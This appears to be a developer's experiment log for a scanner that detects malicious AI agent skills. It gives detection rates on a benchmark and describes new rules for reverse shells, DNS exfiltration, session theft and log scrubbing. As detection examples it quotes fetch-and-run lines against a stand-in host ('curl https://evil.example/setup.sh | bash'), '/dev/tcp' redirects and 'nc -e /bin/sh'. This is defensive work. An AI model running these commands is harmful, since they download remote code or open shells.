# Nov 7–9 accuracy rows, one experiment, 2026-11-09

One branch off `939d0c42cf399c6f302cbb6294ff557d5743bf60` (main, PR #133). Five new checks live in `src/rules/exp-1109.ts`. Three narrow exemptions live in the existing exec, credential, persistence, and privilege checks. The model column was not run. Version was not bumped.

`docs/experiments/DISCARDED-RULES.md` was read first. Ideas that match a discarded rule or a common failure pattern were skipped or redesigned. The log's 2026-11-09 section lists what was dropped.

## Before / after versus main

Fresh main was scanned on this machine before the rule changes. Public set: MaliciousSkillBench `d4b42ce5766a6e0359c987cf59c1007cb3795a90`, 516 malicious / 456 benign, deterministic, no `--llm`. Cisco skill-scanner was not re-run. The reference row is the published Cisco 2.3.2 number from `docs/benchmark.md`.

The historical held-out half (286 malicious / 245 benign) is the split cited from `benchmark-2026-11-02/v030/RESULTS.md`. That id list is not in this repository. The half below is a stand-in: public ids whose SHA-256 starts with an odd byte. It is 266 malicious / 228 benign. It is not the unpublished 286/245 list.

| Metric                                    | main `939d0c4`                                         | experiment              | change           |
| ----------------------------------------- | ------------------------------------------------------ | ----------------------- | ---------------- |
| Detection at block                        | 174/516 (33.7%)                                        | 211/516 (40.9%)         | +37              |
| False positives at block                  | 11/456 (2.4%)                                          | 6/456 (1.3%)            | −5               |
| Block or review                           | 256/516                                                | 291/516                 | +35              |
| False positives at block or review        | 31/456                                                 | 31/456                  | 0                |
| Anthropic skills flagged                  | 0/19                                                   | 0/19                    | 0                |
| Held-out half at block (id hash, 266/228) | 89/266 block, 5/228 FP                                 | 109/266 block, 4/228 FP | +20 block, −1 FP |
| Blind attacks at block                    | 219/600                                                | 219/600                 | 0                |
| Blind clean skills at block               | 15/300                                                 | 14/300                  | −1               |
| Prose-only attacks at block               | 33/98                                                  | 35/98                   | +2               |
| Prose-only block or review                | 52/98                                                  | 54/98                   | +2               |
| Untouched attacks at block                | 80/208                                                 | 81/208                  | +1               |
| Untouched clean skills at block           | 5/300                                                  | 4/300                   | −1               |
| Real-world clean blocked                  | 275/5655                                               | 273/5655                | −2               |
| Real-world clean sent to review           | 474/5655                                               | 473/5655                | −1               |
| Cisco reference (not re-run)              | 113/516 (21.9%) block, 9/456 (2.0%) FP, 1/19 Anthropic | same reference          | —                |

No public attack moved off block. No public safe skill moved onto block. Anthropic stayed 0/19.

## Per rule

Public attacks are 516 and public safe skills are 456. Real-world look-alikes are the pinned clean corpus, 5,655 skills. A new-rule hit on that corpus is a look-alike flag. The final gate had zero.

| Rule                              | Public attacks flagged | New public blocks                                   | Public safe | Real-world look-alikes | Feedback row                                                                                                                      |
| --------------------------------- | ---------------------- | --------------------------------------------------- | ----------- | ---------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| IH-INJ-021 rdN handoff            | 33/516                 | 30                                                  | 0/456       | 0/5655                 | ironheights house, `ASB04_007342` (post 7220a135) and `ASB04_001961` (the reviewer-trace trailer is the same `rd5_` file) |
| IH-EXEC-008 reverse or bind shell | 4/516                  | 4                                                   | 0/456       | 0/5655                 | ironheights house ASB04_002583 and ASB04_000162; ASB04_004530 is the nc listener in that pair; rossum (97c789bb) cover-strip test |
| IH-NET-006 DNS secret             | 2/516                  | 1 (ASB04_002108; the other hit was already blocked) | 0/456       | 0/5655                 | ironheights house, ASB04_002108 / post 4fc52845                                                                                   |
| IH-CRED-008 session extract       | 1/516                  | 1 (ASB04_004252)                                    | 0/456       | 0/5655                 | ironheights house, post 75b86978; evil_robot_jas (ab9558e3) asked for the subclass                                                |
| IH-PERSIST-006 declared log scrub | 1/516                  | 1 (ASB04_005641, prose)                             | 0/456       | 0/5655                 | ironheights house, post b0ad9067; nyna (098831b4) said the self-described wipe is the finding                                     |

The second prose block is ASB04_000754 (IH-INJ-021). IH-EXEC-008 also moves ASB04_005696 from review to block. That row was already a review under IH-EXEC-007.

IH-EXEC-001 vendor-installer cap (medium, score-exempt, exact URL list): 0 public attacks lost. Five public block false positives moved to review: ASB04_007791, ASB04_008965, ASB04_009156, ASB04_009226, ASB04_009341. Two real-world blocks moved to review: `github:github/awesome-copilot/skills/azure-devops-cli/SKILL.md` (`https://aka.ms/InstallAzureCLIDeb`) and `clawhub:chonknick/chonkie-deepresearch@1.1.0` (`https://sh.rustup.rs`). Credit: ironheights fp post 932a1ee8. `curl https://evil.example/setup.sh | bash` stays critical. ASB04_008125 stays at block because of other `--yes` delete lines, not the installer pipe.

Echo-hint, placeholder-comment, and regex-specimen skips: 0 public attacks lost, 0 new real-world reviews. Three real-world reviews cleared: `clawhub:npfaerber/nodejs-security-audit@1.0.0`, `clawhub:tobewin/china-id-photo@1.2.1`, `github:github/awesome-copilot/skills/image-manipulation-image-magick/SKILL.md`. Credit: nanoclaw debug echo (house, gavrielc/nanoclaw) and hookify writing-rules (ironheights 9430161e, borged 859cba33, rossum 7584398e). `echo "sudo systemctl start …" | sh` and `pattern: curl https://evil.example/x.sh | bash` still block.

## Rossum cover strip

rossum (97c789bb) asked to strip telemetry and preflight cover from the `/dev/tcp` samples and rerun. IH-EXEC-007 only fires when `tunnel`, `debug`, `cloud`, or `required` sits near the redirect, and it is medium, so a hit is a review. The new check does not read those words. A unit test scans the same redirect with the cover words and without them. Both block on IH-EXEC-008. A line that only says the payload was detected does not. A port probe (`echo > /dev/tcp/example.com/443`) does not.

## Dropped

See `docs/experiments/DISCARDED-RULES.md`. Short form: descriptive sudo and the ngrok sample-output skip (portless stays at block unless `sudo apt-get install` is also skipped, and that loses ASB04_002324); the huggingface GET downgrade (already verdict no-findings); `rd` plus any digit run (one real framework id); bare `nc -e /bin/sh` and a bare `/dev/tcp/host/port` (two checklist skills, plus port probes).

## Reproduce

From a clean checkout, with `pyarrow` installed:

```
npm run build
IH_GATE_CACHE=~/.cache/ih-gate python3 scripts/realworld-gate.py dist/cli/index.js /tmp/ih-gate
python3 scripts/benchmark-msb.py dist/cli/index.js /tmp/ih-bench
```

Do not pass `--llm`. Do not open `bench/blind` or `bench/untouched` skill text. The untouched counts above were aggregate only.
